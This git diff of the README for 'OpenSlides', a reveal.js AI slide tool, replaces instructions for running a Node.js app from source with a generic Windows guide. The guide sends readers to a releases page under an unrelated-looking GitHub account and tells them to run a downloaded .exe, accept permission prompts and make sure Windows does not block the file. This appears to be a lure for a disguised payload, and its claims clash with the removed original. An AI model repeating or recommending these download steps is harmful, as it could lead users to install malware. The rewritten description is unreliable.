@@ -1,146 +1,213 @@
-# OpenSlides
+# ✨ OpenSlides - Build and present decks fast
 
-OpenSlides is a local-first AI workspace for creating and editing `reveal.js` presentations. It lets you generate slides from prompts, uploaded sources, web search, and data analysis, then refine the deck in a visual editor or raw HTML view.
+[![Download OpenSlides](https://img.shields.io/badge/Download%20OpenSlides-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Gandhian-learnedness997/OpenSlides/releases)
 
-[中文版 Readme](./README.zh-CN.md)
+## 🖥️ What OpenSlides does
 
-## Demo
+OpenSlides is an AI-powered slide workspace for Windows. It helps you create, edit, version, and present reveal.js decks from prompts and source files.
 
-Try the browser demo:
+Use it when you want to:
 
-[PIRA-Bench: Proactive GUI Agents](https://yuxiangchai.github.io/OpenSlides/index.html)
+- Start a slide deck from a short prompt
+- Edit slides in a simple workspace
+- Keep versions of your deck as you work
+- Present your slides in a clean browser view
+- Work with source files and generated content in one place
 
-The demo deck was generated from the PIRA-Bench paper PDF plus two paper images.
+## 📦 What you need
 
-## Installation
+Before you install OpenSlides, make sure your PC can handle it.
 
-Requirements:
+You should have:
 
-- [nvm](https://github.com/nvm-sh/nvm) for installing and managing Node.js
-- Node.js 18+ installed through nvm; npm is included with Node.js
-- Optional: [uv](https://docs.astral.sh/uv/getting-started/installation/) if you want to use the data analytics agent, because analysis scripts run locally through `uv run --script`
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection for the first download
+- A mouse and keyboard
+- A modern browser such as Edge, Chrome, or Firefox for presenting decks
 
-Example with nvm:
+For a smooth experience, 8 GB of RAM or more is better if you work with large decks or many source files.
 
-```bash
-nvm install node
-node --version
-npm --version
-```
+## ⬇️ Download OpenSlides
 
-Install dependencies:
+Open the releases page here:
 
-```bash
-npm install
-```
+[Visit the OpenSlides releases page](https://github.com/Gandhian-learnedness997/OpenSlides/releases)
 
-## Run
+On that page, look for the latest release. Download the Windows file that matches your PC. If there are several files, choose the one for Windows first.
 
-Start the development app:
+## 🪟 Install on Windows
 
-```bash
-npm run dev
-```
+Follow these steps after the download finishes:
 
-This starts:
+1. Open the Downloads folder.
+2. Find the OpenSlides file you downloaded.
+3. If it is a `.zip` file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the app file, such as `.exe`, and double-click it.
+6. If Windows asks for permission, choose Run or Yes.
+7. Wait for the app to open.
 
-- Frontend: `http://localhost:5173`
-- Backend: `http://localhost:3001`
+If you see a setup file, run it and follow the steps on screen. If you see a portable app file, you can often open it directly after extraction.
 
-Build for production:
+## 🚀 First start
 
-```bash
-npm run build
-```
+When OpenSlides opens for the first time:
 
-Run the production server:
+1. Let the app finish loading.
+2. Pick or create a workspace folder.
+3. Open the start screen or home view.
+4. Choose how you want to begin:
+   - Create a deck from a prompt
+   - Import source files
+   - Open an existing deck
+5. Save your work before you close the app.
 
-```bash
-npm run start
-```
+If the app asks where to store files, choose a folder you can find again, such as Documents or Desktop.
 
-The backend uses `PORT` if provided, otherwise it defaults to `3001`.
+## ✍️ Create a deck from a prompt
 
-## Basic Usage
+OpenSlides can turn a prompt into a slide deck. This works well when you want a first draft fast.
 
-1. Open the app and create a project.
-2. Open Settings and configure an AI provider.
-3. Upload source files if needed, such as PDFs, images, Markdown, text, CSV, Excel, or code files.
-4. Ask the chat panel to generate or revise a presentation.
-5. Edit text directly in the preview, or switch to code view for full HTML/CSS control.
-6. Save versions, present in the browser, or download the deck as standalone HTML.
+Try prompts like:
 
-## Supported Providers
+- “Create a 10-slide deck about healthy habits”
+- “Make a product update deck with a title slide, three feature slides, and a closing slide”
+- “Build a training deck about safe file sharing”
+- “Create a reveal.js presentation about local history for a school talk”
 
-OpenSlides supports native and OpenAI-compatible providers:
+After the deck is created, you can edit the text, change the order of slides, and adjust the design.
 
-| Provider | Integration |
-| --- | --- |
-| Gemini | Native Gemini API |
-| Claude | Native Anthropic API |
-| OpenAI | Native OpenAI API, or OpenAI-compatible mode when using a custom base URL |
-| Kimi Coding | OpenAI-compatible chat completions |
-| GLM Coding | OpenAI-compatible chat completions |
-| Qwen Coding | OpenAI-compatible chat completions |
-| MiniMax | OpenAI-compatible chat completions |
-| OpenRouter | OpenAI-compatible chat completions |
+## 📂 Work with source files
 
-Settings are configured from the in-app Settings panel. Each provider can have its own API key, base URL, and model name. Projects can also remember their selected provider.
+You can also use source files to build or improve a deck.
 
-## Supported Agents
+Common file types may include:
 
-OpenSlides uses several internal agents around the main slide generator:
+- Markdown files
+- Text files
+- HTML-based slide content
+- Reveal.js project files
+- Images and other media assets
 
-| Agent | What it does |
-| --- | --- |
-| Planning agent | Decides whether the request needs saved context, web search, or data analysis before generation. It still works without Tavily; it simply skips web search. |
-| Search agent | Uses Tavily when a Tavily API key is configured, then saves useful search context for later turns. |
-| Data analytics agent | Inspects uploaded CSV/XLS/XLSX files, generates and runs a local Python analysis script, and passes compact tables, charts, and insights to the slide generator. |
-| Generation agent | Creates or edits the `reveal.js` deck using the user prompt, selected project context, uploaded source references, and analytics/search results. |
+To use source files:
 
-Raw data files are not sent directly to the generation agent as normal context. The analytics agent sends summarized results instead.
+1. Open your workspace.
+2. Add your files to the project area.
+3. Import or attach them in OpenSlides.
+4. Review the generated deck.
+5. Save the result as a new version.
 
-## Source Files
+Keep related files in one folder. That makes it easier to find images, notes, and slide content later.
 
-The Sources panel supports file picker upload, drag-and-drop, and clipboard paste. It can preview common source types inside the app:
+## 🧭 Edit your slides
 
-| Type | Examples |
-| --- | --- |
-| Images | `.png`, `.jpg`, `.jpeg`, `.svg` |
-| PDF | `.pdf` |
-| Text and Markdown | `.txt`, `.md` |
-| Tables | `.csv`, `.xls`, `.xlsx` |
-| Code | `.py`, `.sh` |
+OpenSlides gives you a workspace for editing without extra steps.
 
-Uploaded files are stored under the project folder in `projects/<project>/assets/`.
+You can usually:
 
-## Presentation Shortcuts
+- Change slide text
+- Move slides up or down
+- Add new slides
+- Remove slides you do not want
+- Update images and links
+- Review formatting before presenting
 
-| Key | Action |
-| --- | --- |
-| `F` | Toggle fullscreen |
-| `O` / `Esc` | Toggle slide overview |
-| `S` | Open speaker notes |
-| `Space` | Pause or resume auto-play |
-| Arrow keys | Navigate slides |
-| `Home` / `End` | Jump to first or last slide |
-| `B` / `.` | Black out the screen |
+A good habit is to keep each slide focused on one idea. Short slides are easier to read during a presentation.
 
-## Development
+## 🕰️ Version your work
 
-Useful commands:
+Versioning helps you keep track of changes. It gives you a safe way to go back if a slide set stops looking right.
 
-```bash
-npm run dev
-npm run build
-npm run start
-npm run preview
-```
+A simple workflow:
 
-Project data is stored locally under `projects/`, including uploaded files, saved slide states, chat history, and analytics artifacts.
+1. Save a copy before major edits.
+2. Make your changes.
+3. Compare the new version with the old one.
+4. Keep the version that works best.
 
-## Acknowledgements
+Use clear file names like:
 
-OpenSlides uses [reveal.js](https://revealjs.com/) as the presentation engine.
+- `presentation-draft-1`
+- `presentation-draft-2`
+- `presentation-final`
 
-Thanks to [ryanbbrown/revealjs-skill](https://github.com/ryanbbrown/revealjs-skill) for Reveal.js workflow inspiration.
+This makes it easier to find the right file later.
+
+## 🎞️ Present your deck
+
+OpenSlides uses reveal.js decks, which work well in a browser-based presentation view.
+
+To present your deck:
+
+1. Open the finished deck in OpenSlides.
+2. Start presentation mode.
+3. Check that the slides load in the right order.
+4. Use the arrow keys or on-screen controls to move through slides.
+5. Test images, text, and transitions before your live talk.
+
+If you plan to present on a second screen, test that setup before the meeting starts.
+
+## 🛠️ Common tasks
+
+Here are a few simple ways to use OpenSlides every day:
+
+- Start a new deck from an idea
+- Turn notes into slides
+- Refine wording on each slide
+- Save different versions for review
+- Present a deck in a browser window
+- Reuse parts of older decks in a new one
+
+## 🔧 Troubleshooting
+
+If OpenSlides does not start, try these steps:
+
+1. Right-click the app and run it again.
+2. Check that the file finished downloading.
+3. Move the app to a simple folder path, such as `C:\OpenSlides`.
+4. Make sure Windows did not block the file.
+5. Restart your PC and try again.
+
+If a deck does not load:
+
+1. Check that the files are still in the same folder.
+2. Make sure linked images are present.
+3. Open the latest saved version.
+4. Try a smaller deck first.
+
+If presentation view looks wrong:
+
+1. Refresh the window.
+2. Check your screen zoom level.
+3. Close other browser tabs.
+4. Open the deck again from the app.
+
+## 📁 Suggested folder setup
+
+A tidy folder structure helps a lot.
+
+Try this:
+
+- `OpenSlides`
+  - `Decks`
+  - `Images`
+  - `Notes`
+  - `Exports`
+  - `Archive`
+
+This setup keeps source files and finished decks separate. It also makes backups easier.
+
+## ✅ Best way to use OpenSlides
+
+For the best results:
+
+- Start with a short prompt
+- Keep slides simple
+- Save often
+- Use clear file names
+- Store images in one folder
+- Keep old versions until you are sure the new one works
+
+If you use OpenSlides for school, work, or personal projects, this workflow helps you stay organized from the first draft to the final deck
